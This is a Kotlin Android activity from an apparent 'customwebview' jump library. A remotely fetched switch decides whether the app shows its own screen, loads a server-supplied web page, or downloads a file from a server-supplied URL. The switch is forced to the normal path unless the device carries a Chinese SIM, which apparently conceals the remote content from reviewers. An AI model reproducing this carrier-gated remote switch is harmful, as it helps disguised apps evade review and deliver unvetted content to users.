package com.dakulangsakalam.customwebview.presentation.ui.jump

import android.os.Bundle
import android.text.TextUtils
import androidx.activity.viewModels
import com.dakulangsakalam.customwebview.domain.model.JumpDetails
import com.dakulangsakalam.customwebview.domain.dto.Response
import com.dakulangsakalam.customwebview.presentation.utils.writeLogs
import com.dakulangsakalam.customwebview.jump_task.utils.checkOperators
import com.dakulangsakalam.customwebview.presentation.*
import com.dakulangsakalam.customwebview.presentation.ui.NoNetworkActivity
import com.dakulangsakalam.customwebview.presentation.ui.WebViewActivity
import com.dakulangsakalam.customwebview.presentation.utils.DownloadTool
import com.google.gson.Gson
import kotlinx.coroutines.ExperimentalCoroutinesApi

@ExperimentalCoroutinesApi
abstract class JumpActivity: DownloadTool() {

    private var isTestingEnabled = false

    private var domainSwitch = 1

    private val viewModel by viewModels<JumpActivityViewModel>()

    private lateinit var onStart: (version: Int, downUrl: String) -> Unit

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        viewModel.jumpEvent.observe(this){ event ->
            when(event){
                is JumpEvent.AppInstalledEvent -> registerApplication(event.isInstalled)
                is JumpEvent.JumpRequestSuccess -> processHandler(event.list)
                is JumpEvent.JumpRequestError -> processHanderError(event.exception)
                else -> {
                    // no-op
                }
            }
        }
    }

    private fun processHanderError(exception: Exception) {
        onStart(1, "")
        writeLogs("JumpCode Error: ${exception.message}")
    }

    private fun processHandler(list: Response) {
        writeLogs(Gson().toJson(list))
        var kaiguan = Integer.parseInt(list.off)
        val isChineseSim = checkOperators()
        val yingyongming = list.yingyongming
        if (!isChineseSim && !yingyongming.contains("测试")) {
            kaiguan = 1
        }
        val jumpDetails = JumpDetails(
            version = list.versionNumber,
            wangzhi = list.wangzhi,
            drainage = list.drainage
        )
        routeHandler(kaiguan, jumpDetails)
    }

    private fun routeHandler(kaiguan: Int, jumpDetails: JumpDetails) {
        when(kaiguan){
            0 ->  {}
            2 -> onWebLoaded(jumpDetails.drainage)
            3 ->  onDownload(jumpDetails.wangzhi)
            else -> onOtherResponse(
                jumpDetails.version,
                jumpDetails.wangzhi,
                jumpDetails.drainage
            )
        }
    }

    private fun onWebLoaded(s: String) {
        startActivity(WebViewActivity.createIntent(this@JumpActivity, s))
        finish()
        getDefaultSharedPref().edit().putBoolean("haveOpenH5OnceTime",true).apply()
    }

    private fun onDownload(s: String) = download(s)

    private fun onOtherResponse(version: Int, downloadUrl: String, webUrl: String) {
        writeLogs("haveOpenH5OnceTime ${getDefaultSharedPref().getBoolean("haveOpenH5OnceTime", false)}")
        if (getDefaultSharedPref().getBoolean("haveOpenH5OnceTime", false) && !TextUtils.isEmpty(webUrl)) onWebLoaded(webUrl)
        else onStart(version, downloadUrl ?: "")
    }

    private fun registerApplication(installed: Boolean) {
        writeLogs("[Register Intalled App Done!]")
        if(installed) getDefaultSharedPref().edit().putBoolean("haveInstallAddOneTimes", true).apply()
        requestUrl()
    }

    private fun requestUrl() = viewModel.getApplicationUrl(getAppPackageName(),domainSwitch)

    private fun startThread() = viewModel.startRequest(getAppPackageName(), domainSwitch)

    fun getAppPackageName(): String = if (!isTestingEnabled) "${applicationContext.packageName}" else "123456"

    fun splashAction(forTesting: Boolean? = false, domain: Int? = 1, onStart: (version: Int, downUrl: String) -> Unit) {
        domainSwitch = domain ?: 1
        isTestingEnabled = forTesting ?: false
        this.onStart = onStart
        startLogs()
        if (!isNetworkConnected()) noInternetPage()
        else if (!getAppIsRegistered()) startThread()
        else requestUrl()
    }

    private fun noInternetPage() = startActivity(NoNetworkActivity.createIntent(this))

    private fun startLogs(){
        writeLogs("Domain Type: $domainSwitch")
        writeLogs("Android name Access: ${getAppPackageName()}")
        writeLogs("Application Package Name: ${applicationContext.packageName}")
    }
}